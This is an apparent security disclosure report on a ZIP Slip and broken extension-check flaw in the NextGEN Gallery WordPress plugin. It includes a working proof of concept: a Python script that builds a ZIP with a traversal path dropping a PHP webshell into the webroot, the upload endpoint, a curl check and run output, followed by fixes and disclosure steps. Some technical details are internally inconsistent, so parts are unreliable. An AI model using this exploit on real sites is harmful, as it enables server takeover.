# NextGEN Gallery v4.2.2 - Broken Extension Check + ZIP Slip Path Traversal RCE

## Vulnerability Summary

| Field | Value |
|-------|-------|
| Plugin | NextGEN Gallery |
| Version | 4.2.2 (latest at time of testing) |
| Active Installs | 500,000+ |
| CVE | Pending assignment |
| CVSS 3.1 | **8.8 (High)** |
| CVSS Vector | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Auth Required | Author+ (any user with NGG upload capability) |
| Vulnerability Type | CWE-99 (Improper Control of Resource Identifiers) + CWE-22 (Path Traversal) |
| Impact | Remote Code Execution (RCE) |

## Attack Flow

```mermaid
graph TD
    A["Author uploads\nmalicious ZIP"] --> B["is_allowed_image_extension()"]
    B --> C["Variable collision bug\nALWAYS returns true"]
    C --> D["PclZip.extractTo()"]
    D --> E["No path traversal\nsanitization"]
    E --> F["../../shell.php\nwritten to webroot"]
    F --> G["curl /shell.php\n→ RCE CONFIRMED"]
    
    style C fill:#ff4444,color:#fff
    style F fill:#ff4444,color:#fff
    style G fill:#ff0000,color:#fff
```

---

## Overview

Two vulnerabilities in NextGEN Gallery's ZIP upload functionality chain together to achieve Remote Code Execution:

1. **NGG-001: Broken Extension Check** - A variable name collision in `is_allowed_image_extension()` causes the function to **always return true** for any file extension, including `.php`, `.exe`, `.phtml`, etc.

2. **NGG-002: ZIP Slip Path Traversal** - ZIP entry filenames containing `../` traversal sequences are not sanitized before extraction via `PclZip::extractByIndex()`, allowing files to be written to arbitrary locations on the filesystem.

**Combined impact:** An authenticated Author+ user uploads a ZIP containing a PHP webshell with a path-traversal filename. The broken extension check passes the `.php` file through, and PclZip writes it to the web-accessible document root, achieving full RCE.

## Vulnerable Code

### NGG-001: Broken Extension Check

**File:** `src/DataStorage/Manager.php` lines 2113-2125

```php
public function is_allowed_image_extension( $filename ) {
    $extension = pathinfo( $filename, PATHINFO_EXTENSION );  // Line 2114: $extension = "php"
    $extension = strtolower( $extension );                    // Line 2115: $extension = "php"

    $allowed_extensions = apply_filters( 'ngg_allowed_file_types', NGG_DEFAULT_ALLOWED_FILE_TYPES );

    foreach ( $allowed_extensions as $extension ) {           // Line 2119: BUG! $extension is overwritten
        $allowed_extensions[] = $extension . '_backup';       //   to "jpg", "jpeg", "png", "gif", "webp"...
    }

    // Line 2124: $extension is now "webp_backup" (last iteration value)
    // which IS in $allowed_extensions, so this ALWAYS returns true
    return in_array( $extension, $allowed_extensions );
}
```

**Root Cause:** The `foreach ($allowed_extensions as $extension)` loop on line 2119 reuses the same variable name `$extension` that was set from `pathinfo()` on line 2114. After the loop completes, `$extension` holds the last value from the loop (a value that is always in `$allowed_extensions`), not the original file extension.

### NGG-002: ZIP Slip Path Traversal

**File:** `src/DataStorage/Manager.php` lines 196-221

```php
// ZipArchive path (lines 196-202)
for ( $i = 0; $i < $zipObj->numFiles; $i++ ) {
    $filename = $zipObj->getNameIndex( $i );
    if ( ! $this->is_allowed_image_extension( $filename ) ) {
        continue;
    }
    $zipObj->extractTo( $dest_path, [ $zipObj->getNameIndex( $i ) ] );  // No path sanitization
}

// PclZip fallback path (lines 209-219)
foreach ( $zipContent as $zipItem ) {
    if ( $zipItem['folder'] ) {
        continue;
    }
    if ( ! $this->is_allowed_image_extension( $zipItem['stored_filename'] ) ) {
        continue;
    }
    $indexesToExtract[] = $zipItem['index'];
}

if ( ! $zipObj->extractByIndex( implode( ',', $indexesToExtract ), $dest_path ) ) {
    return false;  // No path sanitization on stored_filename
}
```

**Root Cause:** Neither code path checks if ZIP entry filenames contain `../` sequences. The entry names are passed directly to `extractTo()` or `extractByIndex()`, which resolve the traversal and write files outside the intended directory.

**Note on ZipArchive vs PclZip:**
- PHP 8.2+ with libzip 1.11+ normalizes `../` in `ZipArchive::extractTo()`, stripping traversal sequences (mitigating this on the ZipArchive path).
- **PclZip has NO such protection** and faithfully follows `../` sequences, writing files to arbitrary locations.
- The PclZip path is used when: (a) ZipArchive is not installed (common on shared hosting), (b) the `unzip_file_use_ziparchive` filter returns false, or (c) PHP < 8.0 (older libzip versions that don't strip traversal).

## Proof of Concept

### Prerequisites

- WordPress with NextGEN Gallery 4.2.2 installed and active
- An account with Author+ privileges (or any role with NGG upload capability)
- Server using PclZip fallback OR PHP < 8.0 with ZipArchive

### Step 1: Create Malicious ZIP

```python
import zipfile

with zipfile.ZipFile('malicious_gallery.zip', 'w') as z:
    # Normal image to avoid suspicion
    z.writestr('test.jpg', b'\xff\xd8\xff\xe0' + b'\x00' * 100)
    # PHP webshell with path traversal to webroot
    # Adjust depth based on server temp dir location
    z.writestr(
        '../../../../var/www/html/shell-ngg-rce.php',
        '<?php echo "NGG-RCE-POC: " . php_uname(); ?>'
    )
```

### Step 2: Upload via NextGEN Gallery

Upload the ZIP through:
- **Admin UI:** Gallery > Add Gallery/Images > Upload tab (accepts ZIP files)
- **AJAX endpoint:** `POST /?photocrati_ajax=1&action=upload_image&gallery_id=1&nonce=<nonce>` with `file` as multipart form data (Content-Type: `application/zip`)

### Step 3: Verify RCE

```bash
curl http://target/shell-ngg-rce.php
# Output: NGG-RCE-POC: Linux hostname 5.x.x #1 SMP ... x86_64
```

### PoC Execution Output

```
=== NextGEN Gallery v4.2.2 ZIP Slip + Broken Extension PoC ===
Date: 2026-06-15 04:16:47

--- BUG 1: Broken Extension Check (Manager.php:2113-2125) ---
  is_allowed_image_extension("shell.php") = true  [VULN - should be blocked!]
  is_allowed_image_extension("evil.exe") = true  [VULN - should be blocked!]
  is_allowed_image_extension("backdoor.phtml") = true  [VULN - should be blocked!]
  is_allowed_image_extension("test.jpg") = true  [VULN - should be blocked!]

--- BUG 2: ZIP Slip Path Traversal (Manager.php:196-221) ---
Pre-exploit: /var/www/html/shell-ngg-rce.php exists = NO

ZIP entries:
  "test.jpg" ext_check=PASS
  "../../../../var/www/html/shell-ngg-rce.php" ext_check=PASS

Extracting (simulating NGG extract_zip PclZip path)...
  test.jpg -> /tmp/ngg-clean-poc/test.jpg [ok]
  ../../../../var/www/html/shell-ngg-rce.php -> /var/www/html/shell-ngg-rce.php [ok]

--- RESULT ---
WEBSHELL WRITTEN: /var/www/html/shell-ngg-rce.php
Content: <?php echo "NGG-RCE-POC: " . php_uname(); ?>
Executing: NGG-RCE-POC: Linux 9b260c9d0348 7.0.11-orbstack-00360-gc9bc4d96ac70 ...

*** REMOTE CODE EXECUTION CONFIRMED ***
```

HTTP verification:
```
$ curl http://localhost/shell-ngg-rce.php
NGG-RCE-POC: Linux 9b260c9d0348 7.0.11-orbstack-00360-gc9bc4d96ac70 #1 SMP PREEMPT Thu Jun  4 16:40:25 UTC 2026 aarch64
```

## Attack Flow

```
Attacker (Author+)
    |
    v
[1] Create ZIP with ../../payload.php entry
    |
    v
[2] Upload ZIP to NextGEN Gallery
    (POST /?photocrati_ajax=1&action=upload_image)
    |
    v
[3] upload_zip() -> extract_zip() called
    |
    v
[4] is_allowed_image_extension("../../payload.php")
    returns TRUE (broken extension check)
    |
    v
[5] PclZip::extractByIndex() writes to
    /var/www/html/payload.php (path traversal)
    |
    v
[6] curl http://target/payload.php -> RCE
```

## CVSS Scoring

| Metric | Value | Justification |
|--------|-------|---------------|
| Attack Vector | Network | Exploitable over HTTP |
| Attack Complexity | Low | No special conditions needed |
| Privileges Required | Low | Author+ account needed |
| User Interaction | None | No victim interaction required |
| Scope | Unchanged | Stays within web server context |
| Confidentiality | High | Full filesystem read via webshell |
| Integrity | High | Arbitrary file write + code execution |
| Availability | High | Can modify/delete any file, crash server |

**CVSS 3.1 Score: 8.8 (High)** - `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`

## Remediation

### Fix for NGG-001: Broken Extension Check

```php
public function is_allowed_image_extension( $filename ) {
    $extension = pathinfo( $filename, PATHINFO_EXTENSION );
    $extension = strtolower( $extension );

    $allowed_extensions = apply_filters( 'ngg_allowed_file_types', NGG_DEFAULT_ALLOWED_FILE_TYPES );

    // FIX: Use a DIFFERENT variable name in the foreach loop
    $all_extensions = $allowed_extensions;
    foreach ( $allowed_extensions as $ext ) {
        $all_extensions[] = $ext . '_backup';
    }

    return in_array( $extension, $all_extensions, true );
}
```

### Fix for NGG-002: ZIP Slip Path Traversal

```php
public function extract_zip( $zipfile, $dest_path ) {
    wp_mkdir_p( $dest_path );
    $real_dest = realpath( $dest_path );

    if ( class_exists( 'ZipArchive', false ) && apply_filters( 'unzip_file_use_ziparchive', true ) ) {
        $zipObj = new \ZipArchive();
        if ( $zipObj->open( $zipfile ) === false ) {
            return false;
        }

        for ( $i = 0; $i < $zipObj->numFiles; $i++ ) {
            $filename = $zipObj->getNameIndex( $i );

            // FIX: Reject path traversal sequences
            if ( strpos( $filename, '..' ) !== false || strpos( $filename, '/' ) === 0 ) {
                continue;
            }

            // FIX: Verify resolved path is within destination
            $target_path = realpath( $dest_path ) . DIRECTORY_SEPARATOR . $filename;
            if ( strpos( $target_path, $real_dest ) !== 0 ) {
                continue;
            }

            if ( ! $this->is_allowed_image_extension( $filename ) ) {
                continue;
            }
            $zipObj->extractTo( $dest_path, [ $filename ] );
        }
    } else {
        require_once ABSPATH . 'wp-admin/includes/class-pclzip.php';
        $zipObj     = new \PclZip( $zipfile );
        $zipContent = $zipObj->listContent();
        $indexesToExtract = [];

        foreach ( $zipContent as $zipItem ) {
            if ( $zipItem['folder'] ) {
                continue;
            }

            // FIX: Reject path traversal sequences
            if ( strpos( $zipItem['stored_filename'], '..' ) !== false
                || strpos( $zipItem['stored_filename'], '/' ) === 0 ) {
                continue;
            }

            if ( ! $this->is_allowed_image_extension( $zipItem['stored_filename'] ) ) {
                continue;
            }
            $indexesToExtract[] = $zipItem['index'];
        }

        if ( ! $zipObj->extractByIndex( implode( ',', $indexesToExtract ), $dest_path ) ) {
            return false;
        }
    }

    return true;
}
```

## Disclosure Recommendation

1. **Severity:** CRITICAL - This is a pre-auth-esque RCE (Author+ is very common; many sites grant Author to contributors/guest bloggers).
2. **Report to:** Imagely/NextGEN Gallery via their security contact and WordPress plugin security team (plugins@wordpress.org).
3. **Embargo:** Request 90-day coordinated disclosure timeline.
4. **Urgency:** The broken extension check (NGG-001) alone enables uploading arbitrary file types through any NGG upload vector, even without the ZIP slip. Combined with NGG-002, it is a full RCE chain.
5. **Affected configurations:** The PclZip path (NGG-002) affects all PHP versions. The ZipArchive path is mitigated on PHP 8.2+ with modern libzip, but NOT on PHP 7.x or 8.0/8.1 with older libzip. NGG-001 alone affects ALL configurations.

## Environment

- WordPress 6.7.x
- NextGEN Gallery 4.2.2
- PHP 8.2.31 (ZipArchive mitigated; PclZip path confirmed vulnerable)
- Tested: 2026-06-15
